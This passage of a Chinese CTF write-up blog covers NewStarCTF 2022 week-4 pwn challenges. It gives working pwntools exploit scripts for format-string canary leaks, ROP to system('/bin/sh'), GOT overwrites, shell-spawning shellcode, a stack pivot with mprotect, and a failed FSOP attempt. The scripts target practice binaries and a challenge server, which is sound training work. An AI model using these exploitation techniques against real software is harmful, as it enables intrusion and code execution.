class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>r.interactive()<br>payload=<span class="hljs-string">b&#x27;%29c%10$hhn%37c%11$hhn%9c%12$hhn&#x27;</span>+p64(<span class="hljs-number">0x602082</span>)+p64(<span class="hljs-number">0x602080</span>)+p64(<span class="hljs-number">0x602081</span>)<br>se(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK4">WEEK4</h2><h3 id="canary">canary</h3><p>保护全开</p><p>存在两个格式化字符串漏洞</p><p><img src="/2022/11/16/newstarctf2022/2.png" alt="2"></p><p>backdoor里有system，bss段有/bin/sh</p><p><img src="/2022/11/16/newstarctf2022/3.png" alt="3"></p><p>思路是泄露canary，改money长度造成溢出，rop出 system(/bin/sh)</p><p>偏移为6</p><p><img src="/2022/11/16/newstarctf2022/4.png" alt="4"></p><p>gdb调试可看到canary偏移为11</p><p><img src="/2022/11/16/newstarctf2022/5.png" alt="5"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25326</span> )<br>    libc = ELF(remote_libc)<br><span class="hljs-keyword">else</span>:<br>    r = gdb.debug(local_file)<br>    libc = ELF(local_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;pid&quot;</span>+<span class="hljs-built_in">str</span>(proc.pidof(r)))<br><span class="hljs-comment">#------------------------</span><br>offest=<span class="hljs-number">6</span><br>sla(<span class="hljs-string">&#x27;Now answer me, will you v me 50\n&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaa,%11$p,%17$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>true_main=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>pie_base=true_main-<span class="hljs-number">0x9e4</span><br>money=<span class="hljs-number">0x20206C</span><br>true_money=money+pie_base<br>info(<span class="hljs-string">&#x27;true_money&#x27;</span>,true_money)<br><span class="hljs-comment">#pause()</span><br>sla(<span class="hljs-string">&#x27;What do you want to say to the canary\n&#x27;</span>,<span class="hljs-string">&#x27;%200c%8$n&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+p64(true_money))<br>pop_rdi=<span class="hljs-number">0xb33</span>+pie_base<br>binsh=<span class="hljs-number">0x202020</span>+pie_base<br>system=<span class="hljs-number">0x9DC</span>+pie_base<br>sl(flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>,canary,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>,pop_rdi,binsh,system))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="这是堆🐴">这是堆🐴</h3><p>下标可以小于0，bss段有个指针指向自己(貌似还有个off by null)，Edit功能用负数配合该指针达成任意写</p><p>show功能泄露libc后，改atoi为system，填入binsh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sea(<span class="hljs-string">&#x27;Any data?\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sea(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------------------------</span><br>you_found_me=<span class="hljs-number">0x602080</span><br><span class="hljs-comment">#debug()</span><br>edit(-<span class="hljs-number">12</span>,flat(you_found_me,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>show(-<span class="hljs-number">11</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>atoi_plt=<span class="hljs-number">0x602058</span><br>edit(-<span class="hljs-number">12</span>,flat(atoi_plt))<br><span class="hljs-comment">#print(p64(system)[0:6])</span><br>edit(-<span class="hljs-number">12</span>,p64(system)[<span class="hljs-number">0</span>:<span class="hljs-number">7</span>])<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="OhMyShellcode">OhMyShellcode</h3><p>呃呃呃，只检测到0x19,只要syscall在0x19长度后即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#--------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi,0</span><br><span class="hljs-string">    mov rsi,0x23301e</span><br><span class="hljs-string">    mov rdx,0x800</span><br><span class="hljs-string">    mov rax,0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>sea(<span class="hljs-string">&#x27;Show me your magic.\n&#x27;</span>,shellcode)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;Good luck!&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x233000</span>))<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)<br>se(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2csu2">ret2csu2</h3><p>栈迁移到bss段,然后mprotect提权bss段,紧接着执行shellcode即可</p><p>(mprotect的地址要0x1000的倍数，不然无法提权，总的来说这题gdb调试格外重要)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27162</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-comment">#-----------------</span><br>bss=<span class="hljs-number">0x601020</span>+<span class="hljs-number">0x300</span><br>main_read=<span class="hljs-number">0x4006D6</span><br>leave_ret=<span class="hljs-number">0x0000000000400681</span> <span class="hljs-comment"># leave ; ret</span><br>main=<span class="hljs-number">0x400683</span><br>shellcode=<span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span><br>mprotect=elf.got[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>,bss+<span class="hljs-number">0xf0</span>,main_read)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;Also a fun function in this elf.Remember to check it!\n&#x27;</span>,payload)<br>payload1=csu(<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,mprotect)+p64(<span class="hljs-number">0x6013a0</span>)+shellcode<br>payload1=payload1.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload1+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>se(payload1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="这是堆🐎">这是堆🐎</h3><p>这题有难度的</p><p>还开了沙盒，禁用了execve和open</p><p>漏洞依旧存在于Edit 下标小于0没检测，可以数组越界打stdout泄露libc</p><p>因为打印出来的地址太多，变数太多，7f开头的可能是栈地址，libc段的地址，凑巧7f字符等情况</p><p>所以我找了几个可能是libc段的地址，加大概率，如果不是这些地址的话就会报错libc_base undined</p><p>多试几次</p><p>找不到题解，提示的劫持puts不会，自己有另一种思路：</p><p>数组越界打stdout泄露libc</p><p>继续数组越界打stderr，exit来触发IO流，用的是house of apple2的利用链</p><p>(不过这个方法不太好，还得小心翼翼不破坏stdout，破坏掉了调用puts就报错)</p><p>exit并没有调用指定链，不知为啥</p><p>最后虽然失败了，但还是记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#fail exp</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Any data?\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-comment">#------------------------</span><br>edit(-<span class="hljs-number">8</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>rc(<span class="hljs-number">0x648</span>)<br>rc(<span class="hljs-number">0x1000</span>)<br>libc_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-keyword">if</span> (libc_addr-<span class="hljs-number">0x1ed4a0</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x1ed4a0</span> <span class="hljs-comment">#_nl_global_locale</span><br><span class="hljs-keyword">elif</span> (libc_addr-<span class="hljs-number">0x1ee7f0</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x1ee7f0</span> <span class="hljs-comment">#_IO_stdfile_0_lock</span><br><span class="hljs-keyword">elif</span> (libc_addr-<span class="hljs-number">0x8ff50</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x8ff50</span> <span class="hljs-comment">#_IO_new_file_finish</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>stderr=libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br><br>fake_IO_FILE =<span class="hljs-string">b&#x27;  sh&#x27;</span><br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr +<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr + <span class="hljs-number">0x50</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)<br>fake_IO_FILE +=p64(<span class="hljs-number">0xfbad1800</span>)+p64(stderr+<span class="hljs-number">0x163</span>)*<span class="hljs-number">5</span>+p64(stderr+<span class="hljs-number">0x164</span>)+p64(stderr+<span class="hljs-number">0x163</span>) +p64(stderr+<span class="hljs-number">0x164</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr +<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe8</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span 